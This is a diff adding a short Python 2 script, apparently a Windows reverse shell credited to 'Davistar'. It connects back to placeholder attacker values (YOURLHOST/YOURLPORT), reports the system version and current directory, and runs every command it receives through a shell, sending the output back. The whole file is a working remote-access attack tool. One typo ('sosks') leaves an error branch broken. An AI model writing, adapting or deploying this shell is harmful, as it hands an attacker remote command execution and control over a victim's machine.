@@ -1,0 +1,54 @@
+#Author : Davistar
+#coding:utf-8
+
+import socket
+import subprocess
+import os
+import sys
+
+
+LHOST = "YOURLHOST"
+LPORT = YOURLPORT
+DEFAULT_BUFLEN = 4096
+
+def RunShell(lhost, lport):
+    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        socks.connect((lhost,lport))
+    except socket.error:
+        pass
+    
+    version = subprocess.Popen('ver', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    version_out = version.stdout.read() + version.stderr.read()
+    socks.send(version_out)
+    socks.send(os.getcwd()+'> ')
+
+    while True:
+        data = socks.recv(DEFAULT_BUFLEN)
+
+        if data.startswith('quit')==True:
+            break
+            
+        elif data.startswith('cd')==True:
+            path=data[3:]
+            try:
+                check_path = os.path.exists(path)
+                if check_path ==True:
+                    os.chdir(path)
+                    socks.sendall(os.getcwd()+'> ')
+                else:
+                    socks.send('Path Not Found !')
+                
+            except:
+                sosks.send('Path Not Found !')
+            
+        else:
+            try:
+                cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                out_cmd = cmd.stdout.read() + cmd.stderr.read()
+                socks.sendall(out_cmd)
+                socks.sendall(os.getcwd()+'> ')  
+            except:
+                socks.send('Exceptions')
+
+RunShell(LHOST, LPORT)
